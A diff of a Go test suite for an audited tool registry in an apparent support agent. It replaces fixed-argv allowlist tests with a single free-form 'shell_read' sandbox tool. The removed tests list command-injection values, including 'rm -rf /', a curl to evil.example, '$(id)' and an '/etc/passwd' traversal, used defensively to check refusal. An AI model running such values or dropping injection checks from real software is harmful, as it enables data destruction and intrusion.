@@ -34,13 +34,12 @@ func (r *recorder) snapshot() []ToolCall {
 	return append([]ToolCall{}, r.calls...)
 }
 
-// newTestRegistry returns a registry over the real allowlist whose executor is
-// captured rather than run, so the suite never shells out and every assertion
-// is about the argv that *would* have run.
+// newTestRegistry returns a registry over the shipped tools whose executor is
+// captured rather than run, so the suite never shells out.
 func newTestRegistry(t *testing.T) (*Registry, *recorder, *[]string) {
 	t.Helper()
 	rec := &recorder{}
-	r, err := New(Allowlist, rec)
+	r, err := New(Tools, rec)
 	if err != nil {
 		t.Fatalf("New: %v", err)
 	}
@@ -52,112 +51,22 @@ func newTestRegistry(t *testing.T) (*Registry, *recorder, *[]string) {
 	return r, rec, &lastArgv
 }
 
-func TestShippedAllowlistRegisters(t *testing.T) {
-	if _, err := New(Allowlist, &recorder{}); err != nil {
-		t.Fatalf("the shipped allowlist does not register: %v", err)
+func TestTheShippedToolsAreTheSandboxOnly(t *testing.T) {
+	r, _, _ := newTestRegistry(t)
+	if got := strings.Join(r.Names(), ","); got != "shell_read" {
+		t.Errorf("Names = %q, want only shell_read", got)
 	}
 }
 
-// A configuring tool registers — it is a well-formed tool — and then the
-// cluster's own action level decides. At the default level nothing configuring
-// is served, so a registry that was never told a level behaves exactly as the
-// read-only plane did: it advertises no configuring tool and refuses any call
-// to one. Both classes, so that splitting the old single mutating class did not
-// quietly open one of them.
-func TestNoConfiguringToolIsServedAtTheDefaultLevel(t *testing.T) {
-	for _, impact := range []Impact{ImpactOperate, ImpactInternal} {
-		r, err := New([]Tool{{
-			Name: "restart_thing", Argv: []string{"systemctl", "restart", "thing"},
-			Impact: impact,
-		}}, &recorder{})
-		if err != nil {
-			t.Fatalf("a well-formed tool of impact %s should register: %v", impact, err)
-		}
-		if got := r.Names(); len(got) != 0 {
-			t.Errorf("impact %s advertised at the default level: %v", impact, got)
-		}
-		if _, err := r.Call(context.Background(), "restart_thing", nil, true); !errors.Is(err, ErrRefusedAtLevel) {
-			t.Errorf("call of impact %s: err = %v, want ErrRefusedAtLevel", impact, err)
-		}
-	}
-	// An impact from a newer build is refused too, and says something
-	// different: unrecognised is not the same as known-and-withheld.
-	_, err := New([]Tool{{
-		Name: "from_the_future", Argv: []string{"true"}, Impact: Impact(99),
-	}}, &recorder{})
-	if err == nil {
-		t.Fatal("a tool declaring an unknown impact was registered")
-	}
-	if !strings.Contains(err.Error(), "reads and probes only") {
-		t.Errorf("error should say why: %v", err)
-	}
-}
-
-// A probe-class tool is refused unless this agent was built with a probe
-// plane. Enabling probes is a deliberate act at construction; without it the
-// scratch class is exactly as unservable as it was before probes existed.
-func TestAScratchToolCannotRegisterWithoutAProbePlane(t *testing.T) {
-	_, err := New([]Tool{{
-		Name: "probe_fio_volume", Argv: []string{"fio", "--name", "x"},
-		Impact: ImpactScratch,
-	}}, &recorder{})
-	if err == nil {
-		t.Fatal("a load-generating tool was registered on an agent with no probe plane")
-	}
-	if !strings.Contains(err.Error(), "no probe plane") {
-		t.Errorf("error should say why: %v", err)
-	}
-}
-
-// Forgetting the field must not be a way in. The boolean this replaced failed
-// closed on its zero value, and so does the enum.
-func TestAToolThatDeclaresNoImpactCannotRegister(t *testing.T) {
-	_, err := New([]Tool{{
-		Name: "undeclared", Argv: []string{"hex_cli", "-c", "cluster", "-c", "check"},
-	}}, &recorder{})
-	if err == nil {
-		t.Fatal("a tool that declared no impact was registered")
-	}
-	if !strings.Contains(err.Error(), "undeclared") {
-		t.Errorf("error should name the undeclared impact: %v", err)
-	}
-}
-
-// Malformed tools are caught when the agent starts, not when the SaaS happens
-// to call the broken one.
-func TestMalformedToolsAreRefusedAtRegistration(t *testing.T) {
-	cases := []struct {
-		name string
-		tool Tool
-	}{
-		{"undeclared placeholder", Tool{
-			Name: "x", Argv: []string{"hex_cli", "{group}"}, Impact: ImpactRead,
-		}},
-		{"declared but unused", Tool{
-			Name: "x", Argv: []string{"hex_cli"}, Impact: ImpactRead,
-			Params: map[string][]string{"{group}": {"Storage"}},
-		}},
-		{"parameter with no permitted values", Tool{
-			Name: "x", Argv: []string{"hex_cli", "{group}"}, Impact: ImpactRead,
-			Params: map[string][]string{"{group}": {}},
-		}},
-		{"parameterised executable", Tool{
-			Name: "x", Argv: []string{"{prog}", "check"}, Impact: ImpactRead,
-			Params: map[string][]string{"{prog}": {"hex_cli"}},
-		}},
-		{"empty argv", Tool{Name: "x", Impact: ImpactRead}},
-		{"no name", Tool{Argv: []string{"hex_cli"}, Impact: ImpactRead}},
-	}
-	for _, c := range cases {
-		if _, err := New([]Tool{c.tool}, &recorder{}); err == nil {
-			t.Errorf("%s: registered without error", c.name)
-		}
+func TestANonSandboxToolCannotRegister(t *testing.T) {
+	if _, err := New([]Tool{{Name: "cluster_check"}}, &recorder{}); err == nil {
+		t.Error("a tool that is not the sandbox registered")
 	}
 }
 
 func TestUnknownToolIsRefusedAndAudited(t *testing.T) {
 	r, rec, _ := newTestRegistry(t)
-	_, err := r.Call(context.Background(), "run_anything", nil, true)
+	_, err := r.Call(context.Background(), "cluster_check", nil)
 	if !errors.Is(err, ErrUnknownTool) {
 		t.Fatalf("err = %v, want ErrUnknownTool", err)
 	}
@@ -166,76 +75,16 @@ func TestUnknownToolIsRefusedAndAudited(t *testing.T) {
 	}
 }
 
-// The heart of it: a value the allowlist did not anticipate cannot reach the
-// command line. These are refused because they are not in the permitted set —
-// not because anything filtered them, which is the distinction that matters.
-func TestArgumentsOutsideThePermittedSetAreRefused(t *testing.T) {
-	r, rec, _ := newTestRegistry(t)
-	hostile := []string{
-		"Storage; rm -rf /",
-		"Storage && curl evil.example",
-		"Storage`id`",
-		"$(id)",
-		"../../etc/passwd",
-		"Storage\nStorage",
-		"-c",
-		"--help",
-		"",        // empty
-		"storage", // right group, wrong case: exact match means exact
-	}
-	for _, v := range hostile {
-		_, err := r.Call(context.Background(), "cluster_health", map[string]string{"{group}": v}, true)
-		if !errors.Is(err, ErrBadArgument) {
-			t.Errorf("value %q was not refused (err = %v)", v, err)
-		}
-	}
-	for _, c := range rec.calls {
-		if c.Allowed {
-			t.Errorf("a hostile value was allowed: %+v", c)
-		}
-		// The refusal must not echo the value back — an error that repeats the
-		// input turns the audit log into an oracle.
-		if strings.Contains(c.Reason, "rm -rf") {
-			t.Errorf("refusal echoed the rejected value: %q", c.Reason)
-		}
-	}
-}
-
-func TestPermittedArgumentsResolveIntoAFixedArgv(t *testing.T) {
-	r, _, lastArgv := newTestRegistry(t)
-	if _, err := r.Call(context.Background(), "cluster_health", map[string]string{"{group}": "Storage"}, true); err != nil {
-		t.Fatalf("Call: %v", err)
-	}
-	want := []string{"hex_cli", "-c", "cluster", "-c", "health", "Storage"}
-	if strings.Join(*lastArgv, "\x00") != strings.Join(want, "\x00") {
-		t.Errorf("argv = %v, want %v", *lastArgv, want)
-	}
-}
-
-func TestUnexpectedAndMissingArgumentsAreRefused(t *testing.T) {
-	r, _, _ := newTestRegistry(t)
-	// An argument the tool never declared.
-	if _, err := r.Call(context.Background(), "cluster_check", map[string]string{"{group}": "Storage"}, true); !errors.Is(err, ErrBadArgument) {
-		t.Errorf("undeclared argument accepted: %v", err)
-	}
-	// A declared argument left out.
-	if _, err := r.Call(context.Background(), "cluster_health", nil, true); !errors.Is(err, ErrBadArgument) {
-		t.Errorf("missing argument accepted: %v", err)
-	}
-}
-
-// Every call lands in the log, allowed or not — that is what makes vendor
-// access reviewable by the customer after the fact.
+// Every call lands in the log, allowed or not.
 func TestEveryCallIsAudited(t *testing.T) {
 	r, rec, _ := newTestRegistry(t)
 	ctx := context.Background()
-	_, _ = r.Call(ctx, "cluster_check", nil, true)                                          // allowed
-	_, _ = r.Call(ctx, "cluster_health", map[string]string{"{group}": "nope"}, true)        // refused: bad value
-	_, _ = r.Call(ctx, "nonexistent", nil, true)                                            // refused: unknown
-	_, _ = r.Call(ctx, "cluster_health", map[string]string{"{group}": "ClusterLink"}, true) // allowed
+	_, _ = r.Call(ctx, "shell_read", map[string]string{"command": "true"}) // allowed
+	_, _ = r.Call(ctx, "shell_read", map[string]string{"cmd": "true"})     // refused: bad argument
+	_, _ = r.Call(ctx, "nonexistent", nil)                                 // refused: unknown
 
-	if len(rec.calls) != 4 {
-		t.Fatalf("audited %d calls, want 4", len(rec.calls))
+	if len(rec.calls) != 3 {
+		t.Fatalf("audited %d calls, want 3", len(rec.calls))
 	}
 	allowed := 0
 	for _, c := range rec.calls {
@@ -248,8 +97,8 @@ func TestEveryCallIsAudited(t *testing.T) {
 			t.Error("a refusal recorded no reason")
 		}
 	}
-	if allowed != 2 {
-		t.Errorf("allowed = %d, want 2", allowed)
+	if allowed != 1 {
+		t.Errorf("allowed = %d, want 1", allowed)
 	}
 }
 
@@ -275,35 +124,8 @@ func TestAuditRecordsAreReadableJSONLines(t *testing.T) {
 }
 
 func TestAnAuditorIsRequired(t *testing.T) {
-	if _, err := New(Allowlist, nil); err == nil {
+	if _, err := New(Tools, nil); err == nil {
 		t.Error("a registry without an auditor was allowed; every call must be inspectable")
-	}
-}
-
-func TestNamesAreAdvertisedSorted(t *testing.T) {
-	r, _, _ := newTestRegistry(t)
-	got := r.Names()
-	for i := 1; i < len(got); i++ {
-		if got[i-1] > got[i] {
-			t.Fatalf("Names not sorted: %v", got)
-		}
-	}
-	// Not len(Allowlist): the test registry is at the default level, which
-	// serves no configuring class, so the shipped write is registered and
-	// deliberately not advertised.
-	served := 0
-	for _, tool := range Allowlist {
-		if tool.Impact == ImpactRead {
-			served++
-		}
-	}
-	if len(got) != served {
-		t.Errorf("advertised %d tools, %d of the allowlist are served at this level", len(got), served)
-	}
-	for _, n := range got {
-		if n == "create_instance" {
-			t.Error("a configuring tool was advertised at the default level")
-		}
 	}
 }
 
@@ -313,9 +135,8 @@ func (c *closableBuffer) Write(p []byte) (int, error) { return c.b.Write(p) }
 func (c *closableBuffer) Close() error                { return nil }
 func (c *closableBuffer) String() string              { return c.b.String() }
 
-func TestPerToolTimeoutWinsOverTheDefault(t *testing.T) {
+func TestTheToolTimeoutBoundsTheCall(t *testing.T) {
 	r, _, _ := newTestRegistry(t)
-
 	var got time.Duration
 	r.run = func(ctx context.Context, argv []string, maxBytes int) ([]byte, error) {
 		dl, ok := ctx.Deadline()
@@ -325,36 +146,18 @@ func TestPerToolTimeoutWinsOverTheDefault(t *testing.T) {
 		got = time.Until(dl)
 		return []byte("ok"), nil
 	}
-
-	// cluster_check declares 100s; the deadline must reflect it, not the 60s
-	// default. Generous tolerance — this asserts which bound applied, not
-	// scheduler precision.
-	if _, err := r.Call(context.Background(), "cluster_check", nil, true); err != nil {
-		t.Fatalf("Call: %v", err)
-	}
-	if got < 90*time.Second || got > 100*time.Second {
-		t.Errorf("cluster_check deadline ≈%s, want its declared 100s", got.Round(time.Second))
-	}
-
-	// cluster_health declares nothing; the registry default applies.
-	if _, err := r.Call(context.Background(), "cluster_health", map[string]string{"{group}": "Storage"}, true); err != nil {
+	if _, err := r.Call(context.Background(), "shell_read", map[string]string{"command": "true"}); err != nil {
 		t.Fatalf("Call: %v", err)
 	}
 	if got < 50*time.Second || got > 60*time.Second {
-		t.Errorf("cluster_health deadline ≈%s, want the %s default", got.Round(time.Second), defaultTimeout)
+		t.Errorf("shell_read deadline ≈%s, want its declared 60s", got.Round(time.Second))
 	}
 }
 
-// TestATimedOutToolReturnsADistinguishableResult proves the fix for
-// bigstack-oss/cube-advisor-agent#20: a killed process must not report the
-// same "signal: killed" shape as a real crash. Both the caller's error and
-// the audit log's reason must name the timeout, not the kill signal.
-func TestATimedOutToolReturnsADistinguishableResult(t *testing.T) {
+// A killed process reports the timeout, not the raw kill signal (#20).
+func TestATimedOutCallNamesItsLimit(t *testing.T) {
 	rec := &recorder{}
-	r, err := New([]Tool{{
-		Name: "slow", Argv: []string{"true"}, Impact: ImpactRead,
-		Timeout: 20 * time.Millisecond,
-	}}, rec)
+	r, err := New([]Tool{{Name: "slow", Sandbox: true, Timeout: 20 * time.Millisecond}}, rec)
 	if err != nil {
 		t.Fatalf("New: %v", err)
 	}
@@ -362,44 +165,20 @@ func TestATimedOutToolReturnsADistinguishableResult(t *testing.T) {
 		<-ctx.Done()
 		return nil, fmt.Errorf("signal: killed")
 	}
-
-	_, err = r.Call(context.Background(), "slow", nil, true)
-	if !errors.Is(err, ErrToolTimedOut) {
-		t.Fatalf("err = %v, want ErrToolTimedOut", err)
+	out, err := r.Call(context.Background(), "slow", map[string]string{"command": "sleep 1"})
+	if err != nil {
+		t.Fatalf("Call: %v", err)
 	}
-	if !strings.Contains(err.Error(), "20ms") {
-		t.Errorf("error should name the limit that fired: %v", err)
+	if !strings.Contains(string(out), "20ms") {
+		t.Errorf("result should name the limit that fired: %q", out)
 	}
 	if got := rec.calls[0].Reason; strings.Contains(got, "signal: killed") {
 		t.Errorf("audit reason still shows the raw kill signal: %q", got)
 	}
 }
 
-// A failure that is not a timeout — the process ran to completion and simply
-// exited badly — must not be relabelled. Only ctx's own deadline earns the
-// distinguishable message.
-func TestAnOrdinaryFailureIsNotMislabelledATimeout(t *testing.T) {
-	r, rec, _ := newTestRegistry(t)
-	r.run = func(ctx context.Context, argv []string, maxBytes int) ([]byte, error) {
-		return nil, fmt.Errorf("exit status 1")
-	}
-	_, err := r.Call(context.Background(), "cluster_check", nil, true)
-	if errors.Is(err, ErrToolTimedOut) {
-		t.Fatalf("an ordinary failure was reported as a timeout: %v", err)
-	}
-	if rec.calls[0].Reason != "exit status 1" {
-		t.Errorf("audit reason = %q, want the original failure preserved", rec.calls[0].Reason)
-	}
-}
-
 func TestANegativeTimeoutCannotRegister(t *testing.T) {
-	_, err := New([]Tool{{
-		Name:    "broken",
-		Argv:    []string{"true"},
-		Impact:  ImpactRead,
-		Timeout: -time.Second,
-	}}, &recorder{})
-	if err == nil {
+	if _, err := New([]Tool{{Name: "broken", Sandbox: true, Timeout: -time.Second}}, &recorder{}); err == nil {
 		t.Fatal("a negative timeout registered")
 	}
 }
@@ -415,7 +194,7 @@ func TestTimeoutLadderStaysOrdered(t *testing.T) {
 	if serverCallCap >= saasDeadline {
 		t.Errorf("server call cap %s must stay under the SaaS deadline %s", serverCallCap, saasDeadline)
 	}
-	for _, tool := range Allowlist {
+	for _, tool := range Tools {
 		eff := tool.Timeout
 		if eff == 0 {
 			eff = defaultTimeout
